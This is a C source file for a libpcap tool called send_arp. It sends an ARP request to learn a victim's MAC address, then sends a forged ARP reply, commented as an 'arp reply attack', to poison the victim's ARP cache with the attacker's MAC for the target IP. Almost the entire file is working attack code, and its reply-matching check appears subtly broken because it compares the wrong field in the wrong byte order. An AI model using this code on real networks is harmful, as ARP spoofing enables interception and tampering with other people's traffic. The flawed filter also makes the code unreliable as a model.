#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include "arpheader.h"
#include "getmy.h"

void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  uint8_t mymac[ETH_ALEN]; // 6
  uint32_t myip;
  if(getmymac(mymac) == -1) {
    printf("get my mac addr error\n");
    return -1;
  }
  if(getmyip(dev, &myip) == -1) {
    printf("get my ip addr error\n");
    return -1;
  }
  uint8_t sendermac[ETH_ALEN];
  uint32_t senderip = inet_addr(argv[2]);
  uint32_t targetip = inet_addr(argv[3]);
  uint8_t packet[60];
  
  // arp request
  ether_header eth;
  memcpy(eth.ether_shost, mymac, ETH_ALEN);
  uint8_t broadmac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  memcpy(eth.ether_dhost, broadmac, ETH_ALEN);
  eth.ether_type = htons(ETHERTYPE_ARP); // 0x0806
  memcpy(packet, &eth, ETH_HLEN);
  
  arp_header arp;
  arp.arp_hrd = htons(ARPHRD_ETHER); // 0x0001
  arp.arp_pro = htons(ETHERTYPE_IP); // 0x0800
  arp.arp_hln = ETH_ALEN; // 0x06
  arp.arp_pln = 0x04;
  arp.arp_op = htons(ARPOP_REQUEST); // 0x0001
  memcpy(arp.arp_sha, mymac, ETH_ALEN);
  arp.arp_spa = myip;
  uint8_t unknown[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  memcpy(arp.arp_tha, unknown, ETH_ALEN);
  arp.arp_tpa = senderip;
  memcpy(packet + ETH_HLEN, &arp, 28);

  if(pcap_sendpacket(handle, packet, ETH_HLEN + 28) != 0)
  {
    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
    pcap_close(handle);
    return -1;
  }
  
  // arp reply
  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet2;
    int res = pcap_next_ex(handle, &header, &packet2);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    ether_header* temeth = (ether_header*)packet2;
    if(ntohs(temeth -> ether_type) != ETHERTYPE_ARP)
      continue;
    arp_header* temarp = (arp_header*)(packet2 + ETH_HLEN);
    if(ntohs(temarp -> arp_op) != ARPOP_REPLY) 
      continue;
    if(ntohl(arp.arp_spa) != senderip)
      continue;
    memcpy(sendermac, temeth -> ether_shost, ETH_ALEN);
    
    printf("sender mac : ");
    for(int i=0; i<6; i++)
    {
      printf("%02x", sendermac[i]);
      if(i!=5) printf(":");
    }
    printf("\n");
    break;
  }
  
  // arp reply attack
  memcpy(eth.ether_dhost, sendermac, ETH_ALEN);
  memcpy(packet, &eth, ETH_HLEN);
  
  arp.arp_op = htons(ARPOP_REPLY); // 0x0002
  arp.arp_spa = targetip;
  memcpy(arp.arp_tha, sendermac, ETH_ALEN);
  memcpy(packet + ETH_HLEN, &arp, 28);

  if(pcap_sendpacket(handle, packet, ETH_HLEN + 28) != 0)
  {
    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
    pcap_close(handle);
    return -1;
  }
  
  printf("Sending arp is finished\n");
  pcap_close(handle);
  return 0;
}
